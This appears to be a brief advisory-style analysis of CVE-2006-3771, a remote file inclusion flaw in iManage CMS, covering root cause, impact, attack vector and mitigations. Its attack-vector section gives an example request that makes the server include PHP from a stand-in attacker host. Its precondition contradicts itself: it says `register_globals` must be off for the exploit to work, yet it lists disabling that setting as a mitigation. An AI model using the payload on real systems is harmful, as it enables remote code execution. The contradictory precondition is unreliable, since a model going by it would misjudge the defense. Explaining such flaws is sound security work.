### CVE-2006-3771 Analysis:

**Root cause of vulnerability:**
The vulnerability is caused by a lack of proper sanitization of the `absolute_path` parameter in the `component.php` file and other affected files. This parameter is used in an `include()` statement, allowing an attacker to specify a remote or local file path.

**Weaknesses/vulnerabilities present:**
- **Remote File Inclusion (RFI):** The application directly includes the content of a file specified by the attacker via the `absolute_path` parameter.

**Impact of exploitation:**
- **Arbitrary Code Execution:** By including a malicious file from a remote server controlled by the attacker, arbitrary PHP code can be executed on the vulnerable server. This can lead to full system compromise.

**Attack vectors:**
- **HTTP GET parameter:** The vulnerability is triggered by sending a crafted HTTP GET request to various PHP files of the iManage CMS, including a malicious URL in the `absolute_path` parameter, like `http://target.com/[path]/articles.php?absolute_path=http://attacker.com//inject.txt?`

**Required attacker capabilities/position:**
- The attacker needs to be able to send HTTP requests to the vulnerable server.
- The attacker needs to host a malicious PHP file on a server accessible to the vulnerable server.
- The `register_globals` setting needs to be off for the exploit to succeed.

**Additional Details:**

- The exploit affects multiple files within the iManage CMS, as detailed in the advisory.
- The advisory also suggests possible mitigations, such as disabling `register_globals` or properly sanitizing the `absolute_path` variable.
